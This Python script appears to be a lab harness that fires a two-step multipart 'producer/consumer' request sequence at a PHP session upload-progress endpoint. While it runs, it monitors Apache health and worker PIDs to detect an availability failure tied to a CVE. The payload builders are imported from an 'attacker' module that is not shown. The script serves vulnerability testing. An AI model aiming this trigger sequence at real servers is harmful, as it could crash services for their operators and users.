#!/usr/bin/env python3
"""One-shot availability measurement for the session CVE lab.

This sends one bounded A->B diagnostic sequence while a single health-check
thread samples the Apache worker.
"""

import argparse
from datetime import datetime, timezone
import hashlib
from http.cookies import SimpleCookie
import json
from pathlib import Path
import secrets
import threading
import time

from attacker import endpoint_path, parse_target
from session_progress_probe import multipart_consumer, multipart_producer, request


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--target", required=True, help="Loopback lab URL, e.g. http://127.0.0.1:8088")
    parser.add_argument("--expected-php", required=True)
    parser.add_argument("--report", type=Path, required=True)
    parser.add_argument("--execute", action="store_true", help="Send the one-shot sequence")
    args = parser.parse_args()
    scheme, host, port, prefix = parse_target(args.target)
    if scheme not in ("http", "https"):
        parser.error("target must be an HTTP(S) URL")
    paths = {name: endpoint_path(prefix, "session/" + name + ".php")
             for name in ("health", "session-seed", "upload")}
    producer = multipart_producer(6 * 1024 * 1024, "candidate")
    consumer = multipart_consumer()
    run_id = secrets.token_hex(8)
    report = {
        "tool": "one-shot local availability probe",
        "observed_at_utc": datetime.now(timezone.utc).isoformat(),
        "run_id": run_id,
        "target": args.target,
        "expected_php": args.expected_php,
        "executed": args.execute,
        "sample_interval_seconds": 0.5,
        "sample_timeout_seconds": 0.4,
        "producer_body_bytes": len(producer),
        "producer_body_sha256": hashlib.sha256(producer).hexdigest(),
        "consumer_body_bytes": len(consumer),
        "consumer_body_sha256": hashlib.sha256(consumer).hexdigest(),
        "health_samples": [],
        "steps": [],
        "interpretation": "HTTP and PID observations only; no memory-safety or RCE proof",
    }
    if args.report.exists():
        parser.error("report already exists")
    if not args.report.parent.is_dir():
        parser.error("report directory does not exist")
    if not args.execute:
        print(json.dumps(report, ensure_ascii=False, indent=2))
        return

    def save():
        temporary = args.report.with_name(args.report.name + ".tmp")
        temporary.write_text(json.dumps(report, ensure_ascii=False, indent=2) + "\n",
                             encoding="utf-8")
        temporary.replace(args.report)

    save()
    origin = time.monotonic()

    def timed_request(label, method, path, *, body=None, cookie=None, timeout=15.0):
        started = time.monotonic() - origin
        result, set_cookie = request(
            scheme, host, port, method, path, body=body, cookie=cookie,
            timeout=timeout, request_id=f"{run_id}-{label}")
        ended = time.monotonic() - origin
        report["steps"].append({"step": label, "started_seconds": round(started, 3),
                                "ended_seconds": round(ended, 3), "result": result})
        save()
        return result, set_cookie

    health, _ = timed_request("preflight_health", "GET", paths["health"])
    try:
        health_data = json.loads(health.get("body_prefix", ""))
    except json.JSONDecodeError:
        health_data = {}
    if (health.get("http_status") != 200 or
            health_data.get("lab") != "official-cve-lab-v1" or
            health_data.get("php") != args.expected_php or
            health_data.get("sapi") != "apache2handler" or
            str(health_data.get("upload_progress")) not in ("1", "On")):
        report["preflight_failure"] = "health/version/SAPI/upload-progress mismatch"
        save()
        print(args.report)
        return

    seeded, set_cookie = timed_request("seed", "GET", paths["session-seed"])
    try:
        seed = json.loads(seeded.get("body_prefix", ""))
    except json.JSONDecodeError:
        seed = {}
    cookies = SimpleCookie()
    if set_cookie:
        cookies.load(set_cookie)
    session_name = seed.get("session_name")
    if (not seed.get("seeded") or not session_name or session_name not in cookies or
            any(str(seed.get(name)) != "1" for name in
                ("upload_progress_enabled", "upload_progress_cleanup",
                 "use_only_cookies", "use_strict_mode"))):
        report["preflight_failure"] = "valid session and safe progress settings required"
        save()
        print(args.report)
        return
    sid = cookies[session_name].value
    report["session_id_sha256"] = hashlib.sha256(sid.encode("ascii")).hexdigest()
    cookie_header = f"{session_name}={sid}"
    save()

    stop = threading.Event()

    def monitor():
        index = 0
        while not stop.is_set():
            started = time.monotonic() - origin
            result, _ = request(scheme, host, port, "GET", paths["health"],
                                timeout=0.4, request_id=f"{run_id}-monitor-{index}")
            ended = time.monotonic() - origin
            report["health_samples"].append({
                "index": index, "started_seconds": round(started, 3),
                "ended_seconds": round(ended, 3),
                "http_status": result.get("http_status"),
                "worker_pid": result.get("worker_pid_header"),
                "transport_error": result.get("transport_error")})
            index += 1
            stop.wait(max(0.0, 0.5 - (time.monotonic() - origin - started)))

    thread = threading.Thread(target=monitor, name="bounded-health-monitor", daemon=True)
    thread.start()
    time.sleep(1.1)  # two baseline samples, without overlapping the producer
    timed_request("producer", "POST", paths["upload"], body=producer,
                  cookie=cookie_header)
    timed_request("consumer", "POST", paths["upload"], body=consumer,
                  cookie=cookie_header)
    consumer_end = report["steps"][-1]["ended_seconds"]
    # Observe at least three seconds after B and at most fifteen seconds.
    while time.monotonic() - origin - consumer_end < 3.0:
        time.sleep(0.05)
    stop.set()
    thread.join(timeout=1.0)
    final, _ = timed_request("final_health", "GET", paths["health"])
    report["final_health_ok"] = final.get("http_status") == 200
    report["baseline_worker_pid"] = health.get("worker_pid_header")
    report["final_worker_pid"] = final.get("worker_pid_header")
    report["worker_pid_changed"] = (bool(report["baseline_worker_pid"] and
                                         report["final_worker_pid"]) and
                                    report["baseline_worker_pid"] != report["final_worker_pid"])
    samples = report["health_samples"]
    report["monitor_samples"] = len(samples)
    report["monitor_successes"] = sum(s["http_status"] == 200 for s in samples)
    report["monitor_failures"] = sum(s["http_status"] != 200 for s in samples)
    report["post_consumer_failure_samples"] = sum(
        s["http_status"] != 200 and s["started_seconds"] >=
        report["steps"][-2]["started_seconds"] for s in samples)
    save()
    print(args.report)


if __name__ == "__main__":
    main()
